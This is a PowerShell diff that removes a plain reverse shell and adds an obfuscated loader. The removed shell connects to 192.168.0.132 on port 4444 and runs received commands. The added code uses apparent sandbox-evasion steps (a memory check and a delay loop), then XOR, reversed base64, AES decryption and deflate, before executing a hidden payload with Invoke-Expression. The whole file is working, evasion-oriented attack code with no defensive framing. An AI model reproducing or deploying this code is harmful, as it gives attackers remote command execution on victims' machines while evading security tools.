@@ -1,1 +1,65 @@
-$client = New-Object System.Net.Sockets.TCPClient(192.168.0.132, 4444); $stream = $client.GetStream(); [byte[]]$buffer = 0..65535|%{0}; while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2  = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()
+$tpzsurwsru = (Get-Process -Id $PID | Select-Object Name,@{Name="WorkingSet";Expression={($_.ws / 1024kb)}}).WorkingSet
+if ($tpzsurwsru -lt 250) { $iswjpxjpsm = "a" * 300MB }
+$kuxukkjhyo = 0
+$zxtyqpztzmywiw = 30000000
+For ($kuxukkjhyo=0; $kuxukkjhyo -lt $zxtyqpztzmywiw;$kuxukkjhyo++) { $kuxukkjhyo++ }
+$zvyqrowhjjvn = [System.Text.Encoding]::UTF8.GetBytes("yztwwpiiqozrpzvp")
+$hnxvzrpkpvg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VgoeNTFIJhkjWQMfBA4YGUsOHyMAFQM8OSc+Pj8zJEBSLCchHhtdCzoKChhJCjgkGzAyJVgbLDpeRD0DFjhAETIzJg0AMgEDHhUfJiYsDkNNIABcPBRQE0k/KDoHCxs7OiA7GztGJlEQOTtEHgsQJxEUHi4jKCQqG0Q+KxVCRDU0Ph4zThImBBgePjwCMxEJGys9NjIkD1w2AysQQBlOP0sfQDkAKDwxOlgtGgEeLhkUVSI9RhggDzw2Az8xOy4CLwI6QTkBHAQFFgIFKCsZFioxRBwZOh0KGi4PIx8oISAyG1sFQRlaBCBcFDcJIyc6MQsRPxQmGhE3Pz4xOR8sPwE8MhIHPy4/OQsOShQgAQQMSRAWJxVaXSg1OD5ICBg+DB0/NTwmBTMIWzI5CkoECBApHS0uHS4BAERCK0cNDDYPSjk9B185QjteLUVEPzQZEhEFXDk9IioQJhQKJBJBFEscAS5PGl8vHwdDMzUTMEgWOUAuTxocBQJAFhVBESUkAz1bGj0EUQoXGAMqGT48CB0YRy4UOj45KAQ5WSojIjksMA1YOxsNAxJXKyUYDAxGST1FJRAYOAEAAzYIBQwhQlIiRDwvGF8gNldIAQQ9HEIsEDMHGQAOMzACMhFCSj5GSBQHGBkpES44BAs7OD06OEoCTTs1WzgFXl4dIhEtMwpAC0QvAV9GHCM7QgoZHQc3FREBOxEBOh0iG1UKQQ4AGx8SLBBBJAUYCAMzACcDPR1OFgYUTzwgCkkdPDFBNBMEODQgDzkqOR8bAAJFPBcaBRAbIRYZKFwgGlpJKBpNPBkwNSEiPERYChgfFB8lGxJfLhdMPjkzGxEZVgkQAxEFEzJPQzU4ADMNNAlCJBhMDwAOPSE1I0haIUhaSUMINDwSDUIBB1wHUQApCDkbNxMRNj09JA4aAkYLQSUrER8LLyg9PD8WHVsMQgREDSghMSM1EzwkRyBDAxwZAxgaGC0BRgAZJC9HMSJfOwczSiMOAhcjAyYPFiJZJzANEEo1HQM7LhgtDQM4IicGGQs3OEknIi0LHy5CFBAFJSEDHV8/PBdIMAciATEzWyhYPCYCNh07LBwWMk4GED5aKzc3PBkTGkAbHgFCPw4vORYbPkMYEgVMAjUfJSUAGjk4Thg7LxE5HRIFRTJfAT0ZPTQqRxclPws7ERw2EVFcGAMuRQMqJhEzKARPNjgoOjMXNBQSGAIIOgsHQlwSMx4oKCw3FyoxMTcXDTkyO1AESQw9QwkXQjM+OwATFigtWgMrDkUjAzsqFx0ZEU4+LCVBAxQgRw8AOj0AMDIvMy4BKF4RGCgWBREvAC00RUM9EyIfTSgHT1k6LxVFHC5DRgcAQBYiFz0uNTFDPRFPWxhcFT0gGigJE0EbTUAaEQAAABoGMTgzIh4SOxEhNiQ8XF0gFQ5ZJD8USUtNLiQ/KFklFyQyRkkeGVsfCAIALSo/EDYeDQgiTRwhNE8YIEQlIyhGKAAVGzw7SAstDSMSJD1cKVwDJRorLhwwOFszTgY7BQIrAkNFFgRIHDEsESQpIwUbCU0fIE1PCTEMFj8WI1AOJQwUQkEKNzYqKBw4MUMoAxs4MAQFIkEhGyMsNk8WBSEnFh0zOhISBysdEQRPCl8HI0RRGQYqETwXCTEcOTUQUDMnD0QbDllJFx04LjY1Hi04HDZECQ5AKh0sLA0fGRsEKxwXORg/IEUWMkVOGgQqJSReLAZIDBRHQUkcIkICOjghWiowBjFOJAEMICANGQBfIAcfQjESDAYRESY8LTMTAEMLPgpBUU83AA9GTjg+OjgnOR0QAz4PSD0vTBsPCBE9Hg4QOkNLBTE/LAQUOANcOQEoMx4bEjFJKik9MxJbIA42Ak0FBi01GDpNBwJBRTAiF1Y4IjUVQBdKVREfOAAYDR8eSSFJABFfIR9DNEMaES8XACxdHlExRDMrOR8zHz9CNh8sEzs7AjdIODwRNCEbBjw4K0EFLhAGSgMbGzxDLTEzKAocNAAHFwAPGkQYHBBQOAUQPT8URAoNERgYGBsaHAIqEQYFVVkFDBVbRQ5BBhorFQArNQ45RxwMRCMRRQoYB1YKWRUrPxcwM0wCRTsHPxY3PQdbEgIDNwIRBjk0EC47By0cGRYdBDQNDEE6FBsEKzswJCU/DwMdFUMwNkFdGl4WPhApFEQJDCM9NTw+PwoaCk8oKDwUExQ+MSAcAAUZIjlVAUAYFDEwGBNPIzczBR0iSSMeLwIyNxQXERVIPSMoKiBGXz0wKjMKBAEWEws4Xl5PQxs7TwgJFSUnPyIDUDACODNITg4oIRIAHTEDUCIlASwrQjlBRT8jHRUSOQ4ePRkdKz8WJDMzVRoTRBULLh4DGDsXGDkEUiM3AwRGIyELBQJERwAzBEsCQU4GMSIYIQEAGV9DHxJMCz4DDTQ/EDBXOQICEh43GitbNg4BJFwUGklFKUtFNAgzAhVPMVwKAAo1Jz4wLiAfTB4RBylaWjM3QwhIPzkfMUMFExAyODoLVxhGGAtBXwA0AAYHKSNRAyQKBBEYRxMtH005BApaJyglGBMDCS8oEgM2B0EmRjpCFTE3AFUuJkEpPCEtMS8qJAo5MRsOHxErCi4HRDMZDiA+PRMVFQcoMQI4TjsbMQJIKxkLMwtCBh4tGRkOBAIcCy4+PygSIyIJTxM+WBczWkIEFAJfFUEUGBAMJzQ0MC4rWE4lIysaXywRLTo6CV8DNSkMHyAUGkU/NjMxQiYFX0MhEEE1CAAqCEghTiJFAAs+HjMLHBEHHD0eLUYlASwvHCMXE0UDBD5SGScUBkkZHDw+ACEiCzMnIxcmETE/BDAnQE0oPTcHGDoUAC8GKQ8TKA5NCz4xPx0jNkMnH18LMSJZEBcAESciMEohGBMdA10iFiMrQxsfJFIxMBoVMTAYOQkgHxdDRkYxAzcAHzs4HBg7A0IkGTQ4EC0jMR4FAj88NR5HAh4eNA4+MzEGPChfWiwwExsWBwM4SxgzOjk8IikhFxo9ND4bShlGPhMfMQFENgkBBh8yJlIYRUceQy4MFhVKASUuDAEsKxUYHwIOBkEuKCNfGAUqLxBEIUUUICoFNzg8RlVCPUAtGjk0GBtcXiAIJyo/MUkgIxc2IwZYKBopTjY4E0InNBQkQ04CORBJVhg5Kk9GSC0fPQIhMxMZFDYoKAAOQAQeD0MkOkIwOjc7IBNHGBESSyAzEQQmKCwcIQk6KRBCKA5VODUAPgIRIitKQycXQCc2KBpBDgpYXSgMNCZHFwEnHhEDLTBHMQolWw8bJz0bGhBRNi0SFBAvBSYfMzsNGykWNDZBT0ZZUUQdMwMKAjQGFiwbJQcaX14XIRBZSDQVOwsbDgEDBB8lQwoQHj8vPhM7Ex9EICpYXTk6ICoHLh4mVhciE0NDJyc/Bhg3NRECHzI4IDANOyAMGQosODsxAChAODcOQgc8MDAoIDYINTE8Nyg/NRIqJlErAD0lKRQYMz4XOwIDJQsCQFtDABkqBDxNEC0VFEYKKzMOEjk6OwY6PBMTOzZGWCY/XEwLKUMOIQNRGzQaOAYeCF5NNkkgQjs8LDEOMyQzMwQgOQE/DCIZCjAgQB48GC0WID0YIE40RxwPNS0lBV0cN0QpJTYqIRw/GRAmDjIFExY5DVkyTg5AFyMDQ0YjHxEwWzFDAS0+CRcyNhoVRAIEPy0yRCIjNzUrAgIlJh4COTVAIwMFLCMiGD4DLzU8Kg1IVis+OjZAFhovAgdFOgAtOAYMBDIrDjtBEUUnPDgHOTMjOwhfLRNfFjlEQkAVEC4DKCsXGTs1Ny05QyITQwYmMzs5HBw/AgM9Nx4xORdbAgMOLyggAE4pTABNPi8aJyQbGEsBFAkRIBYpESYzBgAkOQ4gGh9MNF8qOA4FBCMDD0gXCB8mE0YTNhcMXDw9BQsVXA0DSRMvKQo/Hz0vN0ZYSCkYEQodBiE0DR8VEB0IXBMKNwFAP0IqNkhNJ09CBB8iIwoBKAInIB0jGzFYSD48Hh8UMSIvJkA9TxUFAwYePBA6VQYmPBlFVkMABQYzBg4TXU81FB8YKVYTA04FNR0nWl9IOTcsDykdGz8eTjEqPj4KKjAcEzxDUjJBEiUZOxAoDC4RPhYjBgwPBzIaPCdQBVY5EEcZBRMDFyMQBiYxAB0kKScTOx9bAypbPzYhGDAXGz1BHj8HAhozQBotSQwRXj1CHwQZIwkWOTU/GzYvDDgAOR8VMzofMUoVLxwmOAYDID82AzIzQTJLJRUgPCAbFgA0JkctRwAwIwMxEzxZO0ElT0AqGzMIGxMmBREJPShGHyIDRC5PEzQvGAMDHS8aFVlLWQZOGgoXGCdYOUY8ChoAEjE0Ex4/DTI8HBYFWAxCBQ04RwogPUlKTDVCASFcHg4wC0kVRUMwEg4bMjcqKF4dGQooDy9bMz0kTidEBzhILQwTHBECAT80B0UaP18gXhkNXUgiIBEUQictPhcPDSdALQgYMUAIVjg9PkYRJSFEXyknSS1ARSkKHxlPRRMtEwM5PT0eEykxKxABHyE7XwlWSx9IEhs3DwAMDg8pIxwSXjMWSAo5NiE9WzYhKAo8Wh5NMSoqFBYhMBIuMkQQDTgBDhoIOEIZCksHRU42XigmPhQBM0MUIjZJMQEfAi1ZPQISGBU2ED04Nx8AICAOICALHz8+HxMCKCoiQiQgJRkCIwtdIB4HCBYrMS1HNFlbGSwUHBsvGAAvNwAQDRowBydeIAUcMwwzMxYTEyEcClskCxM6KSg8ATVDGhYkPFsgFThRCwgREgkWGSASLQAjCiQeTzYSHE4EKi8TNT9bWy1aPSpHPxwaEUE+MDEQBFoZBh8QJTdVGTgoLxgVHAA8BCUbADAyExgaPCwDPj4fJx4WHzsoOTM8PUkdP0AcFi88FUAOAzQ2MTYhChUcHj0tHiQfTEQyHRQCPTAQJhIkLwwIFzEhFQ9FRBwpER8dJl9RFV84KDkVJkQJDDMQXEAkLBgWEjMIEkdDSiAlGQ85BSUaOw89E1U+IxYdJzISJyAPJ104JkMLJD8zHR8THh5aHEUESSFGNw5APzkZJz4WLisBGw8xIg4TFj8sHS0SAhtQOFxVMRQMOFsvDwI4TiAtGSglOQgVPjRIHk8jAQMjASBBOBkeBDUHMiE9Nx4OBh5aQiM/BgUXEElAKAUmLkEfLD8eSghAAyw/FDcYFDpbERAIHisbSRVHAU8IHiI8AgsYIBcrGDcXIhtNDkEEGSovAgkdNB1bVTgcDEkBIgExXCJaIko6OlUFGVJMLQ4RP14dHwg2Gx08AhMhNgQNDyA/Bz5ZLisyMQw8AB0iEQBGUFkaHzE5Ri0kMw1JRBRBASUPJUAZEwMIIDcxPgU7EAheB1o1GR0BES8cF0kiHAA0IQAgIC0LRhdDAA4bPzMvNCIOGi4bNTsSAUNAFDsFI18ZKAFdEzcpSTU2Mi1BBQYHBB4cJilHRwIBBksSPhMuMRE6BQEOBwUuIxo0PzgOMBMKEURdSTsKKiUnLSxCDgVGEwZIHAIESE0uNDdRHAMCE1wGXicvFF8yIx8aHQQVEEcNBDMrPkQKFEA8SCIiGz0UKA0QHUohNEIBQB0WWxwNWxgoOwIbORUfWQYgK0MiThomMBkmCgQSHRkcOFVDFSMiOyYfXR0CIRlPCB4gRiEPPzAMNgUrWUYJGD0eLRE6TjY9OTcZG101MAI5TgosXBkaATwVXi9CPjlAFxZNOzoOHypcISYeARoeNz03FjoRHz1QCBIYNkUEQiEbQS4FXFwFUD0FBwkRHFVACTQfLhUwCSQzSAMgAhkfOD1SHAMGBEczOjICP0E6HywYAAA3HjVGIlE9Lk4lJUM4SU05PwcFMSoDMwwUMB0sR18ILjwBFEE/BygGGQczHTtETwouFCdAWA4pCRMQARMOFUxRLkIaJgEaJjY4AgM/JT0bDBw/GB9ZOwhcLVkdNA8FNDIfNRNBOEY+DDA0RBMYPjIwPk4OOCo+JlgfABIpGyAXL0UZMx0qBxZACjE8Qgc1SQs5Px86Khw6XT0hGDAiKC0ZM0AjPBBZFDgjJUEjMgpSSxYjNCUKRgknLxo6Q0AqMjENMQcJWjkhKDA4Ij4mPjcvRTYtKgcTSRs5Jx8cTklPNSEEThVfXEcEQyVJPTtAGE8DQyYmK18QFy86CgMxBhcwJjAxRQxcNiI4NzxJOD4xMgQ4HD87WFomHxkAIyYZLgk+Ah4gWFg2IjMVNgkiGDVPGTgFADA9E1stHSo3MjUcGD0mOkYEOjY2FTpADy8WTSI6MkdEEDocF0xGGBkyCksxHBoeRwEhMyY2OBYiPBkhIxJCNAkPLyUiKiUcAkYiLhMRRUclCB1DAEIVIxQTGCotHxoyOA8dKAggBQkZJzggNi0DEFtZJBQuTgpIOEUDShdDHiExKxsAVhc9BDsvXx4YPBwDQzoiJi4tAQMtTjQ8Hkw4LxcLXwsWKTVHLhw4UgsNPRYoCyUaNzlBFAovJAgfXzA9RB0bGggAGAYwMB8MKgUxHyckWUdZCUYCDhg5FREOLUFbPS0oKglEGhxOXx8bPFgPMic5B18yBAdMRRI="))
+$xiorhgxmnuz = [System.Text.Encoding]::UTF8.GetBytes($hnxvzrpkpvg)
+$kpjmjjkqnju = $(for ($pvqpnihyqrsjx = 0; $pvqpnihyqrsjx -lt $xiorhgxmnuz.length; ) {
+    for ($jyxzmnyxsgjpqqvn = 0; $jyxzmnyxsgjpqqvn -lt $zvyqrowhjjvn.length; $jyxzmnyxsgjpqqvn++) {
+        $xiorhgxmnuz[$pvqpnihyqrsjx] -bxor $zvyqrowhjjvn[$jyxzmnyxsgjpqqvn]
+        $pvqpnihyqrsjx++
+        if ($pvqpnihyqrsjx -ge $xiorhgxmnuz.Length) {
+            $jyxzmnyxsgjpqqvn = $zvyqrowhjjvn.length
+        }
+    }
+})
+$kpjmjjkqnju = [System.Text.Encoding]::UTF8.GetString($kpjmjjkqnju)
+$zrxpvuvhkqmtnssmw = "$kpjmjjkqnju"
+$ymksrijzhhti = $zrxpvuvhkqmtnssmw.ToCharArray()
+[array]::Reverse($ymksrijzhhti)
+$giknnwnwhrpvtuniu = -join($ymksrijzhhti)
+$prhkgwpzimrj = [System.Convert]::FromBase64String("$giknnwnwhrpvtuniu")
+$rziyjjsmmszs = [System.Convert]::FromBase64String("vzLlK3LI7vRIED6WONZLnyYmJhYT51sxOxqmtbaaTw0=")
+$jkjhhskorqsrmjzzn = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"
+$vqizkguhwqpkrhphx = $jkjhhskorqsrmjzzn.ToCharArray()
+[array]::Reverse($vqizkguhwqpkrhphx)
+$skoqkihkkp = -join($vqizkguhwqpkrhphx)
+$mwzpzjhwupthiuwvs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($skoqkihkkp))
+$zvzzvikvjrigqxy = New-Object "$mwzpzjhwupthiuwvs"
+$ssxiyptpnrxrkxvt = "==wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
+$xpkhrskqzugs = $ssxiyptpnrxrkxvt.ToCharArray()
+[array]::Reverse($xpkhrskqzugs)
+$mtrsprkxgutkgt = -join($xpkhrskqzugs)
+$xzymtpmxjpq = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($mtrsprkxgutkgt))
+$jikhppjxitmmkp = & ([scriptblock]::Create($xzymtpmxjpq))
+$zvzzvikvjrigqxy.Mode = $jikhppjxitmmkp
+$gyvuhmuviw = "==wMykDWJNlTBpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
+$uhrxzhjgus = $gyvuhmuviw.ToCharArray()
+[array]::Reverse($uhrxzhjgus)
+$mzwusprwmhzj = -join($uhrxzhjgus)
+$vrtmyvywzj = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($mzwusprwmhzj))
+$mjvsxzqqsy = & ([scriptblock]::Create($vrtmyvywzj))
+$zvzzvikvjrigqxy.Padding = $mjvsxzqqsy
+$zvzzvikvjrigqxy.BlockSize = 128
+$zvzzvikvjrigqxy.KeySize = 256
+$zvzzvikvjrigqxy.Key = $rziyjjsmmszs
+$zvzzvikvjrigqxy.IV = $prhkgwpzimrj[0..15]
+$ngxqjqkwxzyn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))
+$osqpvowuyrz = New-Object $ngxqjqkwxzyn(,$zvzzvikvjrigqxy.CreateDecryptor().TransformFinalBlock($prhkgwpzimrj,16,$prhkgwpzimrj.Length-16))
+$vryjswzpywrku = New-Object $ngxqjqkwxzyn
+$xknrotgvynzr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))
+$susrhniutzkvpxkwt = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))
+$gxtzwkotuyj = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0="))
+$jpmqwoxmpswusqumx = New-Object $gxtzwkotuyj $osqpvowuyrz, ($susrhniutzkvpxkwt::$xknrotgvynzr)
+$jpmqwoxmpswusqumx.CopyTo($vryjswzpywrku)
+$jpmqwoxmpswusqumx.Close()
+$zvzzvikvjrigqxy.Dispose()
+$osqpvowuyrz.Close()
+$oqtrkzyqhhrwyupyg = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))
+$goxptnnyvzj = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))
+$mggnzjrwxuqzy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))
+$ihtqtiishu = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))
+$hmoyyituizzxyvzhp = $oqtrkzyqhhrwyupyg::$goxptnnyvzj.$ihtqtiishu($vryjswzpywrku.$mggnzjrwxuqzy())
+Invoke-Expression($hmoyyituizzxyvzhp)
